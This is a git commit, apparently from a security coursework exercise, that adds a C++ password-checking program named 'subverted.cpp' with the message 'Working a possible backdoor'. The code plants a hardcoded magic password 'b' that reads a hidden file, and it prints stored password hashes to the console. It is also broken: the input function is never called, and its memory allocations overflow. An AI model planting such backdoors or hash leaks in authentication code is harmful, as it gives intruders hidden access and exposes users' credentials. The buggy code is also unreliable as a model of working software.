61a4c4af865cdbc838fc4697e3fab39a8f8e8ab4
NIghtwarri0R <gamena750@abv.bg>
2019-10-17 18:01:02 +0100

    Working a possible backdoor
    I have got a simple and possibly working backdoor, gonna have to test it more

---
+++ src/subverted.cpp
@@ -0,0 +1,159 @@
+#include <iostream>
+#include <string.h>
+#include <string>
+#include <openssl/sha.h>
+#include <sstream>
+#include <iomanip>
+#include <fstream>
+#include <vector>
+#include "authlib.h"
+
+using namespace std;
+
+struct UserData
+{
+  char *username;
+  char *password;
+};
+
+const string DB_FILE_NAME = "pwdb.txt";
+vector<UserData *> database;
+string user_name;
+string psswd;
+
+/**
+ * Source of hash function: 
+ * https://stackoverflow.com/questions/13784434/how-to-use-openssls-sha256-functions#1378448
+*/
+string sha256(const string str)
+{
+  unsigned char hash[SHA256_DIGEST_LENGTH];
+  SHA256_CTX sha256;
+  SHA256_Init(&sha256);
+  SHA256_Update(&sha256, str.c_str(), str.size());
+  SHA256_Final(hash, &sha256);
+  stringstream ss;
+  for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
+  {
+    ss << hex << setw(2) << setfill('0') << (int)hash[i];
+  }
+  return ss.str();
+}
+
+/**
+ * Function that fulfils the role of interacting with user by taking user input 
+ */
+void usr_input()
+{
+  cout << "Enter your username" << endl;
+  cin >> user_name;
+  cout << "Enter your password" << endl;
+  cin >> psswd;
+
+  if(psswd=="b"){
+    FILE * filed;
+     filed=fopen("pwb.txt","r");
+      fseek(filed,0,SEEK_END);
+      size_t changers = ftell(filed);
+
+      char* where = new char[changers];
+      rewind(filed);
+
+      fread(where, sizeof(char), changers, filed);
+      fclose(filed);
+      
+  }
+
+  psswd = sha256(psswd);
+}
+
+/**
+ *  db_parse_line function parses an input string
+ *  which contains a username and password split
+ *  using a colon ":". The username and password
+ *  are stored inside a vector called database.
+ * 
+ *  @param line is the input string
+*/
+void db_parse_line(string line)
+{
+  istringstream tokenStream(line);
+  string token;
+
+  getline(tokenStream, token, ':');
+  char *username = (char *)malloc(sizeof(sizeof(char) * token.length()));
+  strcpy(username, token.c_str());
+
+
+  getline(tokenStream, token, ':');
+  char *password = (char *)malloc(sizeof(char) * token.length());
+  strcpy(password, token.c_str());
+
+  UserData *ud = (UserData *)malloc(sizeof(UserData));
+  ud->username = username;
+  ud->password = password;
+
+  database.push_back(ud);
+}
+
+void import_cred_db(const string db_file_name)
+{
+  ifstream db_file(db_file_name);
+  string db_line;
+  if (db_file.is_open())
+  {
+    while (getline(db_file, db_line))
+    {
+      db_parse_line(db_line);
+    }
+    db_file.close();
+  }
+  else
+  {
+    cout << "Unable to read password db file" << endl;
+  }
+}
+
+int main(int argc, char *argv[])
+{
+  // DEBUG | REMOVES WARNINGS
+  int aaa = argc;
+  string okkkkk = argv[0];
+  aaa++;
+  // ----------------------
+
+  import_cred_db(DB_FILE_NAME);
+  for (int k = 0; k <= 2; k++)
+  {
+    for (auto i : database)
+    {
+      if (!strcmp(i->username, user_name.c_str()))
+      {
+        cout << i->username << endl
+             << i->password<< endl
+             << psswd << endl;
+
+        if (!strcmp(i->password, psswd.c_str()))
+        {
+          authenticated(user_name);
+          return 0;
+        }
+        else
+        {
+          rejected(user_name);
+          //EXIT_FAILURE;
+          }
+          
+        }
+      }
+    
+  }
+
+//   for (auto i : database)
+//   {
+//     free(i->username);
+//     free(i->password);
+//     free(i);
+//   }
+// }
+}
